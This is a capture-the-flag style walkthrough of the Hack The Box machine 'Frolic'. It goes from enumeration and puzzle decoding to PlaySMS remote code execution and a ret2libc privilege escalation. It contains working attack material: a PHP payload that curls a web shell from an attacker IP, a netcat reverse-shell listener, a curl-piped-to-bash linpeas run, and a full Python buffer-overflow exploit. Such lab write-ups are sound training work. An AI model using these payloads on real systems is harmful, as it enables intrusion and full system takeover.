```bash
ghost@localhost [02:59:56] [~/Documents/hacking/tj-null-boxes/frolic] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.111:1880
Open 10.10.10.111:9999

PORT     STATE SERVICE REASON  VERSION
1880/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: Node-RED
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
9999/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 1880 (Node-RED NodeJS server)

At port 1880, it is running https://nodered.org/.

I tried the default login found on the internet and it failed.


# 9999 (Nginx)

Seems to be default nginx homepage. Nothing there. Running `feroxbuster` gives a handful of URLs.

- http://10.10.10.111:9999/admin/
- http://10.10.10.111:9999/test/
- http://10.10.10.111:9999/backup/
- http://10.10.10.111:9999/backup/.backup
- http://10.10.10.111:9999/dev
- http://10.10.10.111:9999/loop
- http://10.10.10.111:9999/backup/loop

### /test

Got default PHP page, it is running PHP version 7.0.32.


### /backup

Under `/backup` accessing `user.txt` and `password.txt` gives this credential, `admin:imnothuman`

### /admin

Looking the `login.js` gives credential `admin:superduperlooperpassword_lol` which redirects to `success.html` with the following crypted message.

```bash
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?.
```

No idea what that is, googling the text and looking the result around gives one URL for OOK! programming language. From website, executing the code above gives the following output.

```bash
Nothing here check /asdiSIAJJ0QWE9JAS
```

Going to the URL (http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/) gives more gibbrish

```bash
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA
```

Looks like Base64, so decoding gives the following output.

```bash
ghost@localhost [03:37:24] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 --decode
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   487    0   487    0     0    609      0 --:--:-- --:--:-- --:--:--   609
PK     É7M#[i   index.phpUT     |[|[ux
```

Which is still weird, so I try outputting it to the file and check the filetype. It says it is zipfile, so I renamed it and try unzipping it.

```bash
ghost@localhost [03:37:33] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 --decode > random_page
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   487    0   487    0     0    503      0 --:--:-- --:--:-- --:--:--   503

ghost@localhost [03:40:02] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % file random_page
random_page: Zip archive data, at least v2.0 to extract, compression method=deflate

ghost@localhost [03:40:06] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % mv random_page random_page.zip
```

It asks for the password, I tried 2 passwords I found earlier
- superduperlooperpassword_lol
- imnothuman

Both failed. So I use `zip2john` to convert the zip into the hash, and start cracking.

```bash
ghost@localhost [03:42:44] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % zip2john random_page.zip > random_page.zip.hash
ver 2.0 efh 5455 efh 7875 random_page.zip/index.php PKZIP Encr: TS_chk, cmplen=176, decmplen=617, crc=145BFE23 ts=89C3 cs=89c3 type=8

ghost@localhost [03:44:24] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % john --wordlist=/usr/share/wordlists/rockyou.txt random_page.zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (random_page.zip/index.php)
1g 0:00:00:00 DONE (2022-11-11 03:44) 2.500g/s 30720p/s 30720c/s 30720C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Cracking is successful and got the password `password`. With the file unzipped, got `index.php` which contains more cryptic text.

Looks like hex encoding, so uses `xxd` to decode and receives bass64. 

```bash
ghost@localhost [03:50:46] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % cat index.php | xxd -r -p | pbcopy

ghost@localhost [03:49:47] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==" | base64 --decode

+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Which is a brainfuck language, and by executing it online gives output `idkwhatispass`.

### /dev

Running gobuster again found subdirectory `/backup`. Going to the url gives an out `/playsms`.

http://10.10.10.111:9999/dev/backup/playsms gives 404. Going to http://10.10.10.111:9999/playsms shows a new service.


## PlaySMS (http://10.10.10.111:9999/playsms)

From googling I found the default username for `PlaySMS` is admin. With 3 passwords I have, I tried and the following credential works.

`admin:idkwhatispass`.

I am not able to find the specific version it is running. However, from searchsploit result found qutie a bit of exploits.

```bash
ghost@localhost [04:08:59] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % searchsploit playsms
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
PlaySms 0.7 - SQL Injection                                                             | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                          | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                   | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                 | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                            | php/webapps/30177.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                              | php/webapps/48199.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                        | php/webapps/42044.txt
PlaySMS 1.4 - Remote Code Execution                                                     | php/webapps/42038.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)  | php/remote/44599.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload      | php/webapps/42003.txt
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)      | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)      | php/remote/48335.rb
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Will not be focusing on SQL Injection or XSS or CSRF. I will be looking into RCE exploits and LFI/RFI if RCE does not work.

I tried `42038` but cannot find `online.php` or `report_online.html` So I look at the another one `42044`. I am able to find `sendfromfile.php` under My Account.

http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_sendfromfile&op=list

With the CSV exploit below, I uploaded a web shell under `/backup`.

```php
<?php system('curl 10.10.14.8/shell.php -o /var/www/html/backup'); ?>,2,3
```

Then access the shell under http://10.10.10.111:9999/backup/shell.php and gain reverse shell.

```bash
ghost@localhost [04:25:53] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % nc -lvnp 4444
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# User

Found 2 users under `/home`.

```bash
www-data@frolic:/$ ls /home
ayush  sahay

www-data@frolic:/$ cat /home/ayush/user.txt
1a72ab199c6843a722934338ee9d26e7
```

Found database credential at `/var/www/html/playsms/config.php`

```bash
// PHP PEAR DB compatible database engine:
// mysql, mysqli, pgsql, odbc and others supported by PHP PEAR DB
$core_config['db']['type'] = 'mysqli';          // database engine
$core_config['db']['host'] = 'localhost';       // database host/server
$core_config['db']['port'] = '3306';    // database port
$core_config['db']['user'] = 'root';    // database username
$core_config['db']['pass'] = 'ayush';   // database password
$core_config['db']['name'] = 'playsms'; // database name
```

Nothing interesting, so instead I run `linpeas` and output it under `/backup` to inspect later.

```bash
www-data@frolic:~/html/backup$ curl 10.10.14.8/linpeas.sh | bash > linpeas.output
```

Got possible path abuses.
`
```bash
  79   │ ╔══════════╣ PATH
  80   │ ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
  81   │ /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
  82   │ New path exported: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
```

Also under interesting files, found an unknown SUID file.

```bash
1536   │ ════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
1537   │ ╔══════════╣ SUID - Check easy privesc, exploits and write perms
1538   │ ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
...
1547   │ -rwsr-xr-x 1 root root 7.4K Sep 25  2018 /home/ayush/.binary/rop (Unknown SUID binary)
```

I moved the file under `uploads` so I can download to local and test.

```bash
www-data@frolic:/home/ayush/.binary$ cp rop /var/www/html/backup/rop
```


# Privilege escalation

### GDB (Buffer Overflow)

I open with GDB to see if there's buffer overflow.

```bash
ghost@localhost [04:56:50] [~/Documents/hacking/tj-null-boxes/forlic] [master *]
-> % gdb rop
GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from rop...
(No debugging symbols found in rop)
(gdb) r Hello World
Starting program: /home/ghost/Documents/hacking/tj-null-boxes/forlic/rop Hello World
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] Message sent: Hello[Inferior 1 (process 676457) exited normally]
```

Using `gef` to test bufferoverflow.

```bash
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  $_gef0
Undefined command: "$_gef0".  Try "help".
gef➤  echo _gef0
_gef0gef➤
_gef0gefaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaayaaa
Starting program: /home/ghost/Documents/hacking/tj-null-boxes/frolic/rop aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x6161616e in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]

───────registers
$eax   : 0x64
$ebx   : 0xffffcb00  →  0x00000002
$ecx   : 0x0
$edx   : 0xf7fc0500  →  0xf7fc0500  →  [loop detected]
$esp   : 0xffffcad0  →  "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
$ebp   : 0x6161616d ("maaa"?)
$esi   : 0xffffcbb4  →  0xffffcdd6  →  "/home/ghost/Documents/hacking/tj-null-boxes/frolic[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x6161616e ("naaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63

──────stack
0xffffcad0│+0x0000: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"       ← $esp
0xffffcad4│+0x0004: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcad8│+0x0008: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcadc│+0x000c: "raaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcae0│+0x0010: "saaataaauaaavaaawaaaxaaayaaa"
0xffffcae4│+0x0014: "taaauaaavaaawaaaxaaayaaa"
0xffffcae8│+0x0018: "uaaavaaawaaaxaaayaaa"
0xffffcaec│+0x001c: "vaaawaaaxaaayaaa"

────────code:x86:32
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616e

gef➤  pattern offset 0x6161616e
[+] Searching for '6e616161'/'6161616e' with period=4
[+] Found at offset 52 (little-endian search) likely

gef➤  r 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd3adc0d3'
Starting program: /home/ghost/Documents/hacking/tj-null-boxes/frolic/rop 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd3adc0d3'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x64613364 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]

registers ────
$eax   : 0x3c
$ebx   : 0xffffcb20  →  0x00000002
$ecx   : 0x0
$edx   : 0xf7fc0500  →  0xf7fc0500  →  [loop detected]
$esp   : 0xffffcaf0  →  "c0d3"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xffffcbd4  →  0xffffcdfe  →  "/home/ghost/Documents/hacking/tj-null-boxes/frolic[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x64613364 ("d3ad"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63

stack ────
0xffffcaf0│+0x0000: "c0d3"       ← $esp
0xffffcaf4│+0x0004: 0xf7fbf600  →  0x00000000
0xffffcaf8│+0x0008: 0xf7fbfb00  →  0xf7c1ac8a  →  "GLIBC_PRIVATE"
0xffffcafc│+0x000c: 0x00000001
0xffffcb00│+0x0010: 0xffffcb20  →  0x00000002
0xffffcb04│+0x0014: 0xf7e20ff4  →  0x00220d8c
0xffffcb08│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffcb0c│+0x001c: 0xf7c213b5  →   add esp, 0x10

code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x64613364
```

I try again with 52 characters in front, and `d3adc0d3` after. It sets `eip` as `d3ad` and `esp` as `c0de`. Before I make an exploit, I check anything to see if I need to take an account for.

```bash
gef➤  checksec
[+] checksec for '/home/ghost/Documents/hacking/tj-null-boxes/frolic/rop'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

### Making an exploit

First check the `libc` address, and the system architecture.

```bash
www-data@frolic:/home/ayush/.binary$ uname -a
Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 i686 i686 GNU/Linux

www-data@frolic:/home/ayush/.binary$ ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```

The libc address is `0xb7e19000`. Then I need to get the location of `system` and `exit`.

```bash
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

The system address is `0x0003ada0`.

```bash
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```

The exit address is `0x0002e9d0`. Then I need to find a string that has `/bin/sh` in `libc.so.6` binary using `strings` command.

```bash
www-data@frolic:/$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
```

It is at `0x0015ba0b` 

The exploit is as below.

```python
import struct

junk = 'A' * 52 # offset
libc = 0xb7e19000

# system, exit and binsh are at the offset of libc address (that's why need to add libc)
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x0015ba0b)

payload = junk + system + exit + binsh
print payload
```

Then I copy the exploit into the server under `/dev/shm`. And execute `rop` binary with an exploit payload as input.

```bash
www-data@frolic:/home/ayush/.binary$ ./rop $(python /dev/shm/exploit.py)
./rop $(python /dev/shm/exploit.py)
# id
uid=0(root) gid=33(www-data) groups=33(www-data)

# cat /root/root.txt
b4bd8b337ad1ca9a46b119e56859c2c2
```
